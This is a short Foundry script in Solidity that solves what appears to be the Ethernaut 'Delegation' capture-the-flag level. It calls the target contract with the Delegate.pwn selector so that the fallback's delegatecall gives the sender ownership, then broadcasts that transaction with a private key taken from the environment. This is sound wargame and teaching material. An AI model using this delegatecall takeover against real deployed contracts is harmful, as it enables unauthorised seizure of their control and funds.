// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationScript is Script {

    Delegation public delegation;

    constructor() {
        delegation = Delegation(vm.envAddress("DELEGATION_INSTANCE"));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");
        vm.startBroadcast(pk);
        payable(address(delegation)).call{value:0}(abi.encodeCall(Delegate.pwn, ()));
        vm.stopBroadcast();
    }

    // forge script script/delegation.s.sol:DelegationScript --broadcast
}
